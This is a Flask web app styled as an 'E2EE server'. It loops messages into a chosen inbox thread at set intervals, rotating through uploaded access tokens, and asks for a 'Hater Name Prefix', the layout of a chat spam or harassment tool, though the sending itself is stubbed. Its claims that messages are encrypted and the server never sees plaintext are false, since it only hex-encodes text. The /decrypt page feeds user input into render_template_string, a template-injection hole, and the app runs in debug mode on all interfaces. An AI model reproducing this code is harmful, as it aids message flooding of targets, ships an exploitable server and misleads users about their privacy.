import random
import string
import time
from threading import Thread, Event

from flask import Flask, request, render_template_string

# --- Global Data Stores for Task Management ---
# Stores the active Thread objects, indexed by task_id
threads = {}
# Stores the Event objects to signal a thread to stop, indexed by task_id
stop_events = {}
# Stores a log of relayed messages (for the /decrypt simulation)
relayed_messages_log = []

# --- Flask App Initialization ---
app = Flask(__name__)


# --- Helper Function: Message Relaying Logic (Simulated) ---
# NOTE: The actual message sending logic (relay_messages) is simulated here.
# In a real E2EE system, this function would handle:
# 1. Fetching the message content.
# 2. Applying an encryption process (e.g., using a client's E2EE keys).
# 3. Sending the *ciphertext* to the intended recipient via a network request.
def relay_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
    """
    Simulates sending messages with a delay, stopping if signaled.
    """
    # Get the stop event for this task
    stop_event = stop_events.get(task_id)

    if not stop_event:
        print(f"Error: Stop event not found for task {task_id}")
        return

    print(f"Task {task_id} started. Messages: {len(messages)}, Tokens: {len(access_tokens)}")

    message_count = 0
    while not stop_event.is_set():
        if not messages:
            print(f"Task {task_id}: No messages to send. Stopping.")
            break

        # Cycle through messages and tokens
        message_to_send = messages[message_count % len(messages)]
        token = access_tokens[message_count % len(access_tokens)]

        # --- E2EE Simulation Placeholder ---
        # In a real scenario, 'message_to_send' would be encrypted here.
        # For this simulation, we'll just base64 encode it as a mock "ciphertext".
        mock_ciphertext = f"E2EE_CIPHERTEXT({mn}_{message_count}):{message_to_send.encode('utf-8').hex()}"

        # Log the mock ciphertext and metadata
        relayed_messages_log.append({
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
            'token': token[:10] + '...', # Truncate token for log
            'thread_id': thread_id,
            'ciphertext': mock_ciphertext
        })
        print(f"Task {task_id}: Relayed Message {message_count}: {mock_ciphertext}")
        # -----------------------------------

        message_count += 1

        # Wait for the specified interval or until the stop event is set
        stop_event.wait(time_interval)

    print(f"Task {task_id} stopped.")
    # Clean up global stores
    if task_id in threads:
        del threads[task_id]
    if task_id in stop_events:
        del stop_events[task_id]

# ------------------------------------------------------------------

@app.route('/', methods=['GET', 'POST'])
def message_interface():
    """
    Handles the main interface for starting the message relay task.
    """
    if request.method == 'POST':
        # --- 1. Get Token(s) ---
        token_option = request.form.get('tokenOption')

        if token_option == 'single':
            # Get single token from form
            access_tokens = [request.form.get('singleToken')]
        else:
            # Get tokens from uploaded file
            try:
                token_file = request.files.get('tokenFile')
                if not token_file:
                    return "Error: Token file not provided.", 400
                # Decode file content, ignore errors, remove leading/trailing whitespace, split by line
                access_tokens = token_file.read().decode(errors='ignore').strip().splitlines()
                # Filter out any empty lines that might result
                access_tokens = [token for token in access_tokens if token]
            except Exception as e:
                 return f"Error processing token file: {e}", 500

        # --- 2. Get Other Parameters ---
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        
        try:
            # Default to 1 second if 'time' is missing or conversion fails
            time_interval = int(request.form.get('time', 1))
            if time_interval <= 0:
                time_interval = 1
        except ValueError:
            time_interval = 1

        # --- 3. Get Messages ---
        try:
            txt_file = request.files.get('txtFile')
            if not txt_file:
                return "Error: Message file not provided.", 400

            # Decode file content, ignore errors, split by line
            messages = txt_file.read().decode(errors='ignore').splitlines()
            # Filter out any empty lines that might result
            messages = [msg for msg in messages if msg]
            if not messages:
                 return "Error: Message file is empty.", 400
        except Exception as e:
            return f"Error processing message file: {e}", 500

        # --- 4. Start Task ---
        # Generate a unique task ID
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Create a new Event and Thread for the task
        stop_events[task_id] = Event()
        thread = Thread(target=relay_messages, 
                        args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        # --- 5. Return Status Page ---
        return render_template_string(f'''
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="utf-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>ğğˆğ‡ğ€ğ‘ğˆ__ğŒğğƒğ€ğ‹ğŸ‘¿"" ğ—˜ğŸ®ğ—˜ ğ—¦ğ—˜ğ—¥ğ—©ğ—˜ğ—¥</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
                <style>
                    body {{ background-color: #121212; color: white; font-family: sans-serif; }}
                    .container {{ max-width: 600px; margin: 50px auto; padding: 20px; border-radius: 10px; background-color: #1e1e1e; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }}
                    h1 {{ color: #20c997; }}
                </style>
            </head>
            <body>
                <div class="container text-center">
                    <h1>ğ—˜ğŸ®ğ—˜ ğ—¦ğ—˜ğ—¥ğ—©ğ—˜ğ—¥ ğ—•ğ—¬ ğ—©ğ—œğ—¦ğ—›ğ—”ğ—¡ğ—¨</h1>
                    <p class="lead">Task started with ID: <strong>{task_id}</strong></p>
                    <p>Go to <a href="/decrypt">/decrypt</a> to see the relayed (ciphertext) messages and simulate decryption.</p>
                    <hr>
                    <form method="post" action="/stop" class="mt-3">
                        <input type="hidden" name="taskId" value="{task_id}">
                        <button type="submit" class="btn btn-danger btn-lg">Stop Task {task_id}</button>
                    </form>
                    <p class="mt-3"><a href="/">Go back to main interface</a></p>
                </div>
            </body>
            </html>
            ''')

    # --- GET Request: Display the Form ---
    # The HTML/JS is rendered directly from the string provided in the prompt
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>ğ—˜ğŸ®ğ—˜ ğ—¦ğ—˜ğ—¥ğ—©ğ—˜ğ—¥ ğğˆğ‡ğ€ğ‘ğˆ__ğŒğğƒğ€ğ‹ğŸ‘¿""</title>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
      <style>
        body {
            background-color: #121212;
            color: white;
            font-family: sans-serif;
        }
        .container {
            max-width: 400px;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            background-color: #1e1e1e;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.2);
        }
        .form-control {
            background: #333;
            border: 1px solid #555;
            color: white;
        }
      </style>
    </head>
    <body>
      <div class="container text-center">
        <h2>ğ—²ğŸ®ğ—² ğ—¦ğ—²ğ—¿ğ˜ƒğ—²ğ—¿ ğ— ğ—®ğ˜€ğ˜€ğ—®ğ—´ğ—²ğ—¿ ğ˜€ğ—²ğ—»ğ—±ğ—²ğ—¿</h2>
        <p style="color: yellow;">The server relays only <strong>ciphertext</strong>. Decryption happens at the /decrypt route (receiver).</p>
        <form method="post" enctype="multipart/form-data">
          <div class="mb-3">
            <label for="tokenOption" class="form-label">Select Token Option</label>
            <select class="form-control" id="tokenOption" name="tokenOption" required>
              <option value="single">Single Token (Client ID)</option>
              <option value="multiple">Token File (Client IDs)</option>
            </select>
          </div>
          <div class="mb-3" id="singleTokenInput">
            <label for="singleToken" class="form-label">Enter Single Token/Client ID</label>
            <input type="text" class="form-control" id="singleToken" name="singleToken">
          </div>
          <div class="mb-3" id="tokenFileInput" style="display: none;">
            <label for="tokenFile" class="form-label">Choose Token/Client ID File</label>
            <input type="file" class="form-control" id="tokenFile" name="tokenFile">
          </div>
          
          <div class="mb-3">
            <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
            <input type="text" class="form-control" id="threadId" name="threadId" required>
          </div>
          <div class="mb-3">
            <label for="kidx" class="form-label">Enter Hater Name Prefix</label>
            <input type="text" class="form-control" id="kidx" name="kidx" required>
          </div>
          <div class="mb-3">
            <label for="time" class="form-label">Enter Time (seconds)</label>
            <input type="number" class="form-control" id="time" name="time" required value="1">
          </div>
          <div class="mb-3">
            <label for="txtFile" class="form-label">Choose Message File (Plaintext)</label>
            <input type="file" class="form-control" id="txtFile" name="txtFile" required>
          </div>
          <button type="submit" class="btn btn-primary w-100">START ENCRYPTED SEND</button>
        </form>
        <hr>
        <p>View sent ciphertext: <a href="/decrypt">/decrypt</a></p>
      </div>
      
      <script>
      document.addEventListener('DOMContentLoaded', function() {
          function toggleTokenInput() {
              var tokenOptionElem = document.getElementById('tokenOption');
              var singleTokenInput = document.getElementById('singleTokenInput');
              var tokenFileInput = document.getElementById('tokenFileInput');

              if (!tokenOptionElem || !singleTokenInput || !tokenFileInput) return;

              var tokenOption = tokenOptionElem.value;

              singleTokenInput.style.display = (tokenOption === 'single') ? 'block' : 'none';
              tokenFileInput.style.display = (tokenOption === 'multiple') ? 'block' : 'none';
          }

          var tokenOptionElem = document.getElementById('tokenOption');
          if (tokenOptionElem) {
              tokenOptionElem.addEventListener('change', toggleTokenInput);
          }

          toggleTokenInput();
      });
      </script>
    </body>
    </html>
    ''')


@app.route('/stop', methods=['POST'])
def stop_task():
    """
    Handles stopping a running task thread.
    """
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        # Set the event to signal the thread to stop gracefully
        stop_events[task_id].set()
        return f"Task {task_id} has been signaled to stop.", 200
    else:
        return f"Error: Task {task_id} not found or already stopped.", 404

@app.route('/decrypt')
def decrypt_interface():
    """
    Simulates the receiver's interface to view and 'decrypt' messages.
    """
    # Reverse the log to show the newest messages first
    log_html = ""
    for entry in reversed(relayed_messages_log):
        # A simple placeholder for "decryption"
        try:
            # Reverse the mock encryption from relay_messages
            # "E2EE_CIPHERTEXT(prefix_count):hex_data"
            ciphertext_part = entry['ciphertext'].split(':', 1)[1]
            plaintext = bytes.fromhex(ciphertext_part).decode('utf-8', errors='ignore')
            decrypted_status = f'<span class="text-success">âœ… Decrypted: "{plaintext}"</span>'
        except Exception:
            decrypted_status = '<span class="text-danger">âŒ Decryption Failed</span>'
        
        log_html += f"""
        <li class="list-group-item list-group-item-dark mb-2">
            <strong>Time:</strong> {entry['timestamp']}<br>
            <strong>Token:</strong> {entry['token']}<br>
            <strong>Thread:</strong> {entry['thread_id']}<br>
            <strong>Ciphertext:</strong> <code>{entry['ciphertext']}</code><br>
            {decrypted_status}
        </li>
        """

    if not relayed_messages_log:
        log_html = '<li class="list-group-item list-group-item-warning">No messages relayed yet.</li>'

    return render_template_string(f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Decryption Simulation</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
        <style>
            body {{ background-color: #121212; color: white; font-family: sans-serif; }}
            .container {{ max-width: 800px; margin: 50px auto; padding: 20px; border-radius: 10px; background-color: #1e1e1e; box-shadow: 0 0 10px rgba(255, 255, 255, 0.2); }}
            h1 {{ color: #0dcaf0; }}
            code {{ color: #ffc107; background-color: #333; padding: 2px 4px; border-radius: 4px; }}
            .list-group-item-dark {{ background-color: #333 !important; border-color: #444 !important; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1 class="text-center">Relayed Ciphertext Log (Receiver View)</h1>
            <p class="text-center">This simulates the received **ciphertext** and the **decryption** at the client side. The server never sees the plaintext.</p>
            <hr>
            <ul class="list-group">
                {log_html}
            </ul>
            <p class="mt-4 text-center"><a href="/">Go back to main interface</a></p>
        </div>
    </body>
    </html>
    ''')

# --- Run the App ---
if __name__ == '__main__':
    # Set host to '0.0.0.0' to be accessible externally in a network/container
    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
